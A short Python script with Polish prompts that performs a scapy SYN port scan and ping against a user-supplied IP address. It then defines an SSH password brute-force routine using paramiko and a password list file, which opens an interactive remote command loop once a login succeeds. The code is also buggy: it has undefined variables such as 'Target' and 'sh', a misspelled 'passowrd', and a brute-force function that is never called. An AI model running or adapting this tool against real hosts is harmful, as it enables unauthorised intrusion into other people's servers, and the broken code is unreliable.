from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
from scapy.sendrecv import sr1
import paramiko



import sys
SYNACK = 0x12
RSTACK = 0X14
target = input("Podaj adres IP: ")
# for registrated_ports in range(1,1023):
#     open_ports = ()
ports = range(10,30)
def print_ports(port, state):
    print("%s | %s" % (port, state))

def scanport(target, port):
    print("syn scan on, %s with ports %s" % (target, ports))


source_port = RandShort()
for port in ports:
    SynPkt = sr1(IP(dst=target)/TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)
    conf.verb = 0
    if SynPkt != None:
        if SynPkt.haslayer(TCP):
            if SynPkt[TCP].flags == 20:
                print_ports(port, "Closed")
            elif SynPkt[TCP].flags == 18:
                print_ports(port, "Open")
            else:
                print_ports(port, "TCP packet resp / filtered")
        elif SynPkt.haslayer(ICMP):
            print_ports(port, "ICMP resp / filtered")
        else:
            print_ports(port, "Unknown resp")
            print(SynPkt.summary())
    else:
        print_ports(port, "Unanswered")

# def ping(target):
try:
    # conf.verb = 0
    sr1(IP(dst = target)/ICMP(),timeout=3)
    print("ping " + target +" ok")
    # return True
except:
    print("brak odpowiedzi")
    # return False
    # print(target)
    # sys.exit(1)

# -----------Bruteforce
def BruteForce(port):
    passwordFile = open("PasswordList.txt", "r")
    passwords = passwordFile.read().split("\n")
    # passwordFile.close()
    user = input("Enter username: ")
    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    SSHconn.load_system_host_keys()
    # isFind = False
    for password in passwords:
        try:
            SSHconn.connect(Target, port=int(port), username=user, password=password, timeout=1)
            print("[+] Udane logowanie")
            # isFind = True
            while True:

                userCommand = input("Podaj komendę: ")
                stdin, stdout,  stderr =  sh.exec_command(userCommand)
                print(stdout, stdout, stderr())
            break
        except paramiko.ssh_exception.AuthenticationException:
            print("error")
            print("[-] nie poprawne logowanie")
        except paramiko.ssh_exception.SSHException:
            print("problem z banerem")
            time.sleep(10)
            try:
                ssh.connect(target, port, user, passowrd, timeout=1)
                print("[+] Udane logowanie")
            except:
                print("end")
            # isFind = True
